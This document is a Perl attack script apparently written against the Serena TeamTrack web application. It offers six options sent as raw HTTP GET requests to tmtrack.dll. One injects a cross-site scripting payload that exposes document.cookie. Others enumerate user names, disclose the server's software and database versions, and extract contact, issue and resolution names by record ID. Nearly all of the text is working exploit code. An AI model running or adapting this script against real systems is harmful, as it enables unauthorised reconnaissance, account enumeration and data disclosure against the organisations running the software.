#!/usr/bin/perl

use IO::Socket;

if (($#ARGV+1) < 3)
{
 print "Serena_hack.pl option host path
\t1 - Cross Site Scripting issue
\t2 - Enumerate users (First name)
\t3 - System information disclosure
\t4 - Contact name (default is Record ID 1)
\t5 - Name of Issue (default is Record ID 1)
\t6 - Name of Resolution (default is Record ID 1)
";
 exit(0);
}

$option = $ARGV[0];
$host = $ARGV[1];
$path = $ARGV[2];

if ($option > 6)
{
 print "No such option\n";
 exit(0);
}

$remote = IO::Socket::INET->new ( Proto => "tcp", PeerAddr => $host, PeerPort => "80" );

unless ($remote) { die "cannot connect to http daemon on $host" }

print "connected\n";

$remote->autoflush(1);

my $http;

if ($option == 1)
{
 $http = "GET /$path/tmtrack.dll?LoginPage&Template=loginform&Message=<script>alert(document.cookie)</script> HTTP/1.0

";
# Cookie/Cross Site Scripting
}

if ($option == 2)
{ # Enumerate users
 $http = "GET /$path/tmtrack.dll?LoginPage&Template=user HTTP/1.0

";
};

if ($option == 3)
{ # Information disclosure
 $http = "GET /$path/tmtrack.dll?LoginPage&Template=about HTTP/1.0

";
}

if ($option == 4)
{ # Fullname for a certain ID
 $RecordID = 1;
 $http = "GET /$path/tmtrack.dll?LoginPage&Template=viewbody&recordid=$RecordID&tableid=38 HTTP/1.0

";
}

if ($option == 5)
{ # Issue name
 $RecordID = 1;
 $http = "GET /$path/tmtrack.dll?LoginPage&Template=viewbody&recordid=$RecordID&tableid=41 HTTP/1.0

";
}

if ($option == 6)
{ # Resolution name
 $RecordID = 1;
 $http = "GET /$path/tmtrack.dll?LoginPage&Template=viewbody&recordid=$RecordID&tableid=42 HTTP/1.0

";
}

print "HTTP: [$http]\n";
print $remote $http;
sleep(1);
print "Sent\n";

my $display = 1;

if ($option == 2)
{ # Enumerate names
 $display = 0;
 # No need to display the complete HTML
}

if ($option == 3)
{ # System information disclosure
 $display = 0;
}

if ($option == 4 || $option == 5 || $option == 6)
{
 $display = 0;
}

while (<$remote>)
{
 if ($option == 2) # Enumerate names
 {
  if (/<OPTION VALUE=([^>]+)>([^<]+)<\/OPTION>/)
 {
  print "ID: $1, Name: $2\n";
 }
 }

 if ($option == 3)
 {
  if (/<input type="hidden" name="Product_Version.*" value="[ ]+([^"]+)"/)
 {
  print "Product version: $1\n";
 }
  if (/<input type="hidden" name="WebServer.*" value="[ ]+([^"]+)"/)
 {
  print "Web Server version: $1\n";
 }
 if (/<input type="hidden" name="WebServer_OS.*" value="[ ]+([^"]+)"/)
 {
  print "Server version: $1\n";
 }
 if (/<input type="hidden" name="DBMS.*" value="[ ]+([^"]+)"/)
 {
  print "Database version: $1\n";
 }
 }

 if ($option == 4)
 {
  if (/Contact Details<\/span> - ([^<]+)</g)
 {
  print "Full name: $1\n";
 }
 }

 if ($option == 5)
 {
  if (/Problem Details<\/span> - ([^<]+)/g)
 {
  print "Issue name: $1\n";
 }
 }

 if ($option == 6)
 {
  if (/Resolution Details<\/span> - ([^<]+)/g)
  {
   print "Resolution name: $1\n";
  }
 }
 
 if ($display)
 {
  print $_;
 }
}
print "\n";

close $remote;
